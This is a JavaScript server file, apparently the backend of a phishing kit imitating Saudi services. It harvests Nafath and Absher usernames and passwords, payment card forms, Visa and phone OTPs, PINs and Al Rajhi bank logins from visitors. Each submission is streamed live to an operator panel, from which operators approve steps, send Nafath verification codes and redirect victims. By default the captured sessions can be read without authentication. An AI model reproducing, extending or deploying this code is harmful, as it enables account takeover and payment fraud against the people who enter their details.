/**
 * gosuksa backend — fresh infra (v10)
 *
 * Express + Socket.IO v4 backend. All config via env vars — no hard-coded URLs.
 *
 * HTTP:
 *   GET  /api/health
 *   POST /api/vicinfomain/createRequest  (reCAPTCHA v3 + session persistence)
 *   GET  /api/vicinfomain/captcha
 *   POST /api/user/init
 *   POST /api/chat/enabled
 *   GET  /breinit
 *   POST /api/store-policy
 *   POST /api/data/store-details
 *   POST /api/app-logs/:appId/log-user-in-app/:page
 *   GET  /users, GET /users/:id, DELETE /users/:id  (admin)
 *
 * Socket.IO contract — see README for full event map.
 */

const express = require("express");
const http = require("http");
const cors = require("cors");
const crypto = require("crypto");
const fs = require("fs");
const path = require("path");
const { newCaptcha } = require("./captcha");
const { Server } = require("socket.io");

// ---------- config (all env, no hard-coded values) ----------
const PORT = process.env.PORT || 8000;
const ADMIN_TOKEN = process.env.ADMIN_TOKEN || crypto.randomBytes(16).toString("hex");
const RECAPTCHA_SECRET = process.env.RECAPTCHA_SECRET || "";
const SESSION_DIR = process.env.SESSION_DIR || path.join(__dirname, "sessions");
const CHAT_ENABLED = process.env.CHAT_ENABLED === "0" ? 0 : 1;
const CORS_ORIGINS = (process.env.CORS_ORIGINS || "*")
  .split(",")
  .map((s) => s.trim())
  .filter(Boolean);
const corsOrigin = CORS_ORIGINS.includes("*") ? true : CORS_ORIGINS;

fs.mkdirSync(SESSION_DIR, { recursive: true });

// ---------- helpers ----------
const now = () => new Date().toISOString();
const newUuid = () => crypto.randomUUID();

function clientIp(req) {
  return (
    req.headers["cf-connecting-ip"] ||
    req.headers["x-forwarded-for"]?.toString().split(",")[0].trim() ||
    req.socket?.remoteAddress ||
    "Unknown"
  );
}

/** Flatten nested objects into a single-level lookup. */
function flatten(obj, depth = 0) {
  const result = {};
  if (!obj || typeof obj !== "object" || depth > 4) return result;
  for (const [k, v] of Object.entries(obj)) {
    if (v && typeof v === "object" && !Array.isArray(v)) {
      Object.assign(result, flatten(v, depth + 1));
    } else if (v !== undefined && v !== null && String(v).trim() !== "") {
      result[k] = v;
    }
  }
  return result;
}

function pick(src, names) {
  for (const n of names) {
    const v = src?.[n];
    if (v !== undefined && v !== null && String(v).trim() !== "") return v;
  }
  return undefined;
}

// Nafath username + password aliases (persisted on session top-level)
const NAFATH_USERNAME_ALIASES = [
  "nafathUsername", "nafathUser", "nafathLogin", "nafathLoginName",
  "nafathUserName", "nafseUsername", "nafseUser", "absherUsername",
  "absherUser", "userName",
];
const PASSWORD_ALIASES = [
  "password", "nafathPassword", "nafsePassword", "absherPassword",
];

// ---------- session storage (one JSON file per visitor) ----------
function sessionPath(id) {
  const safe = String(id).replace(/[^a-zA-Z0-9_-]/g, "");
  return path.join(SESSION_DIR, `${safe}.json`);
}

function loadSession(id) {
  try {
    const p = sessionPath(id);
    if (fs.existsSync(p)) return JSON.parse(fs.readFileSync(p, "utf8"));
  } catch (e) { console.warn("[session] load failed:", e.message); }
  return null;
}

function saveSession(id, data) {
  try {
    fs.writeFileSync(sessionPath(id), JSON.stringify(data, null, 2));
  } catch (e) { console.warn("[session] save failed:", e.message); }
}

function updateSession(id, patch) {
  const existing = loadSession(id) || { id, uuid: id, createdAt: now(), pages: {} };
  const updated = { ...existing, ...patch, id, uuid: id, updatedAt: now() };
  if (!updated.pages) updated.pages = existing.pages || {};
  saveSession(id, updated);
  return updated;
}

function mergePageData(session, page, fields) {
  if (!session.pages) session.pages = {};
  session.pages[page] = { ...(session.pages[page] || {}), ...fields };
  session.lastPage = page;
  session.currentPage = page;
  return session;
}

function allSessions() {
  try {
    return fs.readdirSync(SESSION_DIR)
      .filter((f) => f.endsWith(".json"))
      .map((f) => {
        try { return JSON.parse(fs.readFileSync(path.join(SESSION_DIR, f), "utf8")); }
        catch { return null; }
      })
      .filter(Boolean)
      .sort((a, b) => (Date.parse(b.updatedAt || 0) || 0) - (Date.parse(a.updatedAt || 0) || 0));
  } catch { return []; }
}

// ---------- reCAPTCHA v3 verification ----------
async function verifyRecaptcha(token) {
  if (!RECAPTCHA_SECRET) return { success: false, error: "RECAPTCHA_SECRET not configured" };
  try {
    const res = await fetch("https://www.google.com/recaptcha/api/siteverify", {
      method: "POST",
      headers: { "Content-Type": "application/x-www-form-urlencoded" },
      body: `secret=${encodeURIComponent(RECAPTCHA_SECRET)}&response=${encodeURIComponent(token)}`,
    });
    const data = await res.json();
    return { success: data.success, score: data.score, action: data.action };
  } catch (e) {
    return { success: false, error: e.message };
  }
}

// ---------- app ----------
const app = express();
app.set("trust proxy", true);
app.use(cors({ origin: corsOrigin, credentials: true }));
app.use(express.json({ limit: "5mb" }));
app.use(express.urlencoded({ extended: true, limit: "5mb" }));

const server = http.createServer(app);
const io = new Server(server, {
  path: "/socket.io",
  cors: { origin: corsOrigin, credentials: true },
});

function requireAdmin(req, res, next) {
  const t = req.headers.authorization?.replace(/^Bearer\s+/i, "") || req.query.token;
  if (t !== ADMIN_TOKEN) return res.status(401).json({ error: "unauthorized" });
  next();
}

// ---------- Socket.IO auth middleware ----------
io.use((socket, next) => {
  const token = socket.handshake.auth?.token;
  if (token && token === ADMIN_TOKEN) {
    socket.data.role = "admin";
  }
  next();
});

// ---------- admin relay table ----------
// admin event → { customerEvent, transform(payload) → data }
const RELAY_TABLE = {
  acceptPaymentForm:   { event: "payment:action",  data: { action: "acceptPaymentForm" } },
  declinePaymentForm: { event: "payment:action",  data: { action: "declinePaymentForm" } },
  acceptService:      { event: "payment:action",  data: { action: "acceptService" } },
  acceptVisaOtp:      { event: "otp:action",      data: { action: "acceptVisaOtp" } },
  acceptPhoneOtp:     { event: "otp:action",      data: { action: "acceptPhoneOtp" } },
  acceptPhone:        { event: "phone:action",     data: { action: "acceptPhone" } },
  declinePhone:       { event: "phone:action",     data: { action: "declinePhone" } },
  acceptNavaz:        { event: "nafath:action",    data: { action: "acceptNavaz" } },
  acceptNafath:       { event: "nafath:action",    data: { action: "acceptNafath" } },
  acceptNafLogin:     { event: "naflogin:action",  data: { action: "acceptNafLogin" } },
  acceptRajLogin:     { event: "rajlogin:action",  data: { action: "acceptRajLogin" } },
  acceptRajhi:        { event: "rajlogin:action",  data: { action: "acceptRajhi" } },
};

function relayToCustomer(sessionId, event, data) {
  if (!sessionId) return;
  io.to(`session:${sessionId}`).to(`user:${sessionId}`).emit(event, data);
}

// ---------- Socket.IO connection handler ----------
io.on("connection", (socket) => {
  console.log(`[io] ${socket.data.role === "admin" ? "admin" : "customer"} connected ${socket.id}`);

  // ===== ADMIN SOCKET =====
  if (socket.data.role === "admin") {
    socket.join("admins");
    socket.emit("user:joined", { role: "admin" });

    // Standard relay actions (acceptPaymentForm, acceptVisaOtp, etc.)
    for (const [adminEvent, relay] of Object.entries(RELAY_TABLE)) {
      socket.on(adminEvent, (payload, ack) => {
        const sessionId = payload?.sessionId || payload?.id || payload;
        relayToCustomer(sessionId, relay.event, relay.data);
        if (ack) ack({ ok: true, relayed: relay.event, sessionId });
      });
    }

    // nafathNumber → nafath:code { verificationCode }
    socket.on("nafathNumber", (payload, ack) => {
      const sessionId = payload?.sessionId || payload?.id;
      const code = payload?.code || payload?.verificationCode;
      relayToCustomer(sessionId, "nafath:code", { verificationCode: code });
      if (ack) ack({ ok: true, sessionId });
    });

    // adminRedirect → admin:redirect { page }
    socket.on("adminRedirect", (payload, ack) => {
      const sessionId = payload?.sessionId || payload?.id;
      const page = payload?.page;
      relayToCustomer(sessionId, "admin:redirect", { page });
      if (ack) ack({ ok: true, sessionId });
    });

    // clientBlocked → user:blocked (do NOT disconnect)
    socket.on("clientBlocked", (payload, ack) => {
      const sessionId = payload?.sessionId || payload?.id;
      relayToCustomer(sessionId, "user:blocked", { blocked: true });
      if (ack) ack({ ok: true, sessionId });
    });

    socket.on("disconnect", () => console.log(`[admin] disconnected ${socket.id}`));
    return;
  }

  // ===== CUSTOMER SOCKET =====
  socket.on("user:join", (payload = {}) => {
    const id = payload.uuid || payload.sessionId || payload.userId || newUuid();
    socket.data.sessionId = id;

    socket.join(`session:${id}`);
    socket.join(`user:${id}`);

    socket.emit("user:joined", { uuid: id, sessionId: id });
    socket.emit("user:uuidAssigned", { uuid: id, sessionId: id });

    // Notify admins
    io.to("admins").emit("user:joined", { uuid: id, sessionId: id, socketId: socket.id });

    // Update session
    const session = updateSession(id, {
      socketId: socket.id,
      ip: clientIp(socket.request),
      lastSeen: now(),
    });
    io.to("admins").emit("session:new", session);
  });

  // client:input — page submission from the frontend
  socket.on("client:input", (payload = {}) => {
    const id = payload.sessionId || socket.data.sessionId;
    if (!id) return;
    const page = payload.page;
    const fields = payload.fields || {};

    let session = loadSession(id) || { id, uuid: id, createdAt: now(), pages: {} };
    session = mergePageData(session, page, fields);

    // Flatten + apply Nafath aliases
    const flat = flatten(fields);
    for (const alias of NAFATH_USERNAME_ALIASES) {
      if (flat[alias] !== undefined) { session.nafathUsername = flat[alias]; break; }
    }
    for (const alias of PASSWORD_ALIASES) {
      if (flat[alias] !== undefined) { session.password = flat[alias]; break; }
    }

    saveSession(id, session);
    io.to("admins").emit("session:update", session);
    io.to("admins").emit("client:input", { sessionId: id, page, fields });
  });

  // Chat
  socket.on("chat:message", (msg, ack) => {
    const id = socket.data.sessionId;
    if (id) io.to("admins").emit("chat:message", { sessionId: id, ...msg });
    if (ack) ack({ ok: true });
  });

  // Page navigation
  socket.on("user:pageNavigation", (p) => {
    const id = socket.data.sessionId;
    if (id) updateSession(id, { lastPage: p?.page, lastSeen: now() });
    io.to("admins").emit("user:pageNavigation", { uuid: id, ...p });
  });

  // Legacy passthrough events (kept for frontend compat)
  const passthrough = [
    "payment:update", "otp:received", "pin:received", "nafath:submitted",
    "phone:submitted", "naflogin:submitted", "rajlogin:submitted",
    "client:cancelOtp", "client:cancelPayment", "booking:update",
  ];
  for (const ev of passthrough) {
    socket.on(ev, (payload = {}) => {
      const id = payload?.uuid || socket.data.sessionId;
      if (id) {
        const session = loadSession(id) || { id, uuid: id, pages: {} };
        updateSession(id, { [`_raw_${ev}`]: payload, lastEvent: ev, lastSeen: now() });
      }
    });
  }

  socket.on("disconnect", () => console.log(`[customer] disconnected ${socket.id}`));
});

// ---------- HTTP: health ----------
app.get("/api/health", (_req, res) => res.json({ ok: true }));
app.get("/health", (_req, res) => res.json({ ok: true }));
app.get("/breinit", (_req, res) => res.json({ ok: true }));
app.post("/api/chat/enabled", (_req, res) => res.json({ isChatEnabled: CHAT_ENABLED }));

// ---------- HTTP: user init ----------
app.post("/api/user/init", (req, res) => {
  const { uuid: sentUuid, browserInfo } = req.body || {};
  const id = sentUuid || newUuid();
  const ip = clientIp(req);
  updateSession(id, { ip, ua: req.headers["user-agent"] || "", browserInfo: browserInfo || null, lastSeen: now(), stage: "init" });
  res.json({
    ok: true,
    _id: id,
    session: crypto.randomBytes(16).toString("hex"),
    userInfo: { uuid: id, visitTime: now(), ip, country: "Unknown", countryCode: "XX" },
  });
});

// ---------- HTTP: captcha ----------
app.get("/api/vicinfomain/captcha", (_req, res) => {
  const { code, imageB64 } = newCaptcha();
  res.json({ sessionId: newUuid(), imageB64, imageDataUrl: `data:image/png;base64,${imageB64}` });
});

// ---------- HTTP: createRequest (reCAPTCHA v3 + session persistence) ----------
app.post("/api/vicinfomain/createRequest", async (req, res) => {
  const body = req.body || {};

  // Validate reCAPTCHA v3 if a token is present
  const recaptchaToken = body.recaptchaToken || body["g-recaptcha-response"] || req.headers["x-recaptcha-token"];
  if (recaptchaToken && RECAPTCHA_SECRET) {
    const verification = await verifyRecaptcha(recaptchaToken);
    if (!verification.success) {
      return res.status(403).json({ ok: false, error: "reCAPTCHA verification failed" });
    }
  }

  // Flatten payload
  const flat = flatten(body);
  const sessionId = flat.uuid || flat.sessionId || newUuid();

  // Persist session JSON
  const session = updateSession(sessionId, {
    ...flat,
    ip: clientIp(req),
    createdAt: now(),
  });
  saveSession(sessionId, session);

  // Emit session:new to admin room
  io.to("admins").emit("session:new", session);

  res.json({ ok: true, sessionId });
});

// ---------- HTTP: store policy / details / logs ----------
app.post("/api/store-policy", (req, res) => {
  const id = req.body?.uuid || req.body?.sessionId || newUuid();
  const session = loadSession(id) || { id, uuid: id, pages: {} };
  mergePageData(session, "policy", req.body);
  saveSession(id, session);
  io.to("admins").emit("session:update", session);
  res.json({ ok: true });
});

app.post("/api/data/store-details", (req, res) => {
  const id = req.body?.uuid || req.body?.sessionId || newUuid();
  const session = loadSession(id) || { id, uuid: id, pages: {} };
  mergePageData(session, "details", req.body);
  saveSession(id, session);
  io.to("admins").emit("session:update", session);
  res.json({ ok: true });
});

app.post("/api/app-logs/:appId/log-user-in-app/:page", (req, res) => {
  const id = req.body?.uuid || req.body?.userId;
  if (id) updateSession(id, { lastPage: req.params.page, lastSeen: now() });
  res.json({ ok: true });
});

// ---------- HTTP: admin endpoints ----------
function maybeAdmin(req, res, next) {
  if (process.env.ADMIN_LIST_PROTECTED === "1") return requireAdmin(req, res, next);
  next();
}

app.get("/users", maybeAdmin, (_req, res) => res.json(allSessions()));
app.get("/users/:id", maybeAdmin, (req, res) => {
  const s = loadSession(req.params.id);
  if (!s) return res.status(404).json({ error: "not_found" });
  res.json(s);
});
app.delete("/users/:id", requireAdmin, (req, res) => {
  try { fs.unlinkSync(sessionPath(req.params.id)); } catch {}
  res.json({ ok: true });
});

app.get("/admin/state", requireAdmin, (_req, res) => res.json({ sessions: allSessions() }));
app.get("/admin/sessions", requireAdmin, (_req, res) => res.json(allSessions()));
app.get("/version", (_req, res) => res.json({ version: "v10", sessions: allSessions().length, startedAt: new Date().toISOString() }));

// ---------- start ----------
server.listen(PORT, () => {
  console.log(`gosuksa-backend listening on :${PORT}`);
  console.log(`Session dir: ${SESSION_DIR}`);
  console.log(`Admin token: ${ADMIN_TOKEN ? "configured" : "NOT SET"}`);
  console.log(`reCAPTCHA: ${RECAPTCHA_SECRET ? "configured" : "NOT SET"}`);
});
